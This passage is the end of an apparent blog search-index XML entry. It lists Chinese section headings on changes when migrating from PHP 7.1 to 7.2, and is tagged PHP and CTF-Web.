现在支持键名</h2><h1 id="从PHP-7-1-x-移植到-PHP-7-2-x"><a href="#从PHP-7-1-x-移植到-PHP-7-2-x" class="headerlink" title="从PHP 7.1.x 移植到 PHP 7.2.x"></a>从 PHP 7.1.x 移植到 PHP 7.2.x</h1><h2 id="新的对象类型"><a href="#新的对象类型" class="headerlink" title="新的对象类型"></a>新的对象类型</h2><h2 id="允许重写抽象方法-Abstract-method"><a href="#允许重写抽象方法-Abstract-method" class="headerlink" title="允许重写抽象方法(Abstract method)"></a>允许重写抽象方法 (Abstract method)</h2><h2 id="扩展了参数类型"><a href="#扩展了参数类型" class="headerlink" title="扩展了参数类型"></a>扩展了参数类型</h2><h2 id="允许分组命名空间的尾部逗号"><a href="#允许分组命名空间的尾部逗号" class="headerlink" title="允许分组命名空间的尾部逗号"></a>允许分组命名空间的尾部逗号</h2>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
      </tags>
  </entry>
</search>
